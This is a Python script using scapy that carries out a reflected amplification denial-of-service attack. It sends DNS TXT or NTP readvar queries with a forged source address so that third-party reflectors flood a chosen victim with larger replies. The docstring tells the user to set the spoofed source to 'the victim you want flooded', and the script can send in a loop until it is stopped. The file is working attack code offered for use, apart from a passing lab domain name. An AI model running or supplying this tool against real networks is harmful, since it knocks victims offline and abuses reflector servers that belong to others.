#!/usr/bin/env python3
"""reflect - bounce a spoofed-source query off a reflector so its reply floods a victim.

Usage: reflect <proto:dns|ntp> <reflector-ip> <spoofed-source-ip> [count] [qname]

    proto              dns  -> a DNS TXT query (the reflector answers with an
                              oversized TXT record)
                       ntp  -> an NTP mode-6 "readvar" control query (the reflector
                              answers with its whole variable list)
    reflector-ip       the third party that will answer
    spoofed-source-ip  the address written into the packet's SOURCE field. The
                       reflector sends its (larger) reply HERE, not to you. Set it
                       to the victim you want flooded.
    count              packets to send; 0 = until Ctrl-C (default 1)
    qname              DNS only: the name to query (default amplify.lab)

Nothing here is a magic button: you name the reflector, the protocol, and the
source you are forging every time. The packet leaves with a source that is not
yours, which is the whole point of the attack and exactly what source-address
verification at the router is meant to stop. The reply's size versus the query's
size is the amplification factor; measure it with tcpdump on the victim.
"""
import random
import sys

from scapy.all import IP, UDP, Raw, DNS, DNSQR, send, conf

conf.verb = 0

# The exact 12-byte NTP mode-6 control header ntpq sends for "readvar" of the
# system variables: byte 0 = LI0/VN2/mode6 (0x16), byte 1 = opcode 2 (readvar),
# then sequence/status/association/offset/count all zero. A shorter or longer
# packet is treated as malformed and draws only a tiny error reply.
NTP_READVAR = b"\x16\x02" + b"\x00" * 10


def build(proto, reflector, spoofed, qname):
    sport = random.randint(1024, 65535)
    if proto == "dns":
        return (IP(src=spoofed, dst=reflector) /
                UDP(sport=sport, dport=53) /
                DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT")))
    if proto == "ntp":
        return (IP(src=spoofed, dst=reflector) /
                UDP(sport=sport, dport=123) /
                Raw(NTP_READVAR))
    sys.exit(f"unknown proto {proto!r} (expected dns or ntp)")


def main():
    if not (4 <= len(sys.argv) <= 6):
        sys.exit(__doc__)
    proto = sys.argv[1].lower()
    reflector = sys.argv[2]
    spoofed = sys.argv[3]
    count = int(sys.argv[4]) if len(sys.argv) >= 5 else 1
    qname = sys.argv[5] if len(sys.argv) == 6 else "amplify.lab"

    pkt = build(proto, reflector, spoofed, qname)
    reqlen = len(bytes(pkt))
    print(f"[*] {proto} query -> {reflector}, source forged as {spoofed} "
          f"({reqlen} bytes on the wire, {'once' if count == 1 else f'{count}x' if count else 'until Ctrl-C'})")
    print(f"    the reply goes to {spoofed}, not to this host")

    try:
        if count == 0:
            send(pkt, loop=1, inter=0.2)
        else:
            send(pkt, count=count, inter=0.2)
    except KeyboardInterrupt:
        pass
    print("[*] done")


if __name__ == "__main__":
    main()
